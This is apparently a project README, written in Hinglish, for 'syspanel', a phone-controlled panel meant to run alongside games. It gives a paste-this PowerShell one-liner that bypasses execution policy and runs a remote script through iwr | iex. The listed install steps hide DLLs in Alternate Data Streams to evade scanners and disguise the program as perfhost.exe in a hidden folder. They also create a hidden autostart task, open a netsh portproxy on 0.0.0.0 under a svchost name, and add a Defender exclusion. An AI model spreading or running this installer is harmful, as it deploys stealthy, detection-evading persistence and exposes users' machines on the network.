# syspanel

Apne PC ke liye one-touch panel install.

## EK LINE INSTALL (apne PC ki PowerShell me):

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1 -UseBasicParsing | iex"
```

Wire tap nahi hua: install.ps1 ke andar REPO URL pehle se lgfire093 ke naam se set hai — upar wali ka maano.

## Ye kya karega:

1. Panel files GitHub se download hongi.
2. DLL teeno **Alternate Data Streams** me seal ho jayengi — PC par koi `.dll` plaintext nahi bachegi, scanner ko nahi milegi.
3. Panel exe chhupi Templates folder me `perfhost.exe` naam se set hogi.
4. **SysCheckUp** hidden task banega — PC on hote hi panel chalu, koi click nahi chahiye.
5. **Phone door** (netsh portproxy, svchost ke naam se) har boot pe silent khulado — phone Chrome me URL kholo, panel aayega; Data usage me panel ka naam kabhi nahi aayega.
6. Defender exclusion isi folder ke liye (own PC, reversible).

## Phone se control:

- PC aur phone same Wi-Fi par.
- install ke waqt jo URL dikha tha (jaise `http://192.168.x.x:5000/`) Chrome me kholo aur bookmark kar lo.
- IP badal jaye (router reboot) → netsh portproxy wildcard door `0.0.0.0` pe khulta hai, sirf URL me IP naya dalna hoga. Router me DHCP reservation kar lo to IP fixed rahega.

## Roz ka use:

1. PC on karo (panel khud chalu).
2. Game kholo.
3. Phone se panel control karo. Bas. Kuch run nahi karna.

## Uninstall (pure clean):

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/USERNAME/syspanel/main/uninstall.ps1 -UseBasicParsing | iex"
```

## Logs/temp:

- Panel koi log file nahi likhta.
- Temp folder me sirf Python runtime ka sauda temporary remnant hota hai jo panel band hote hi delete ho jata hai.
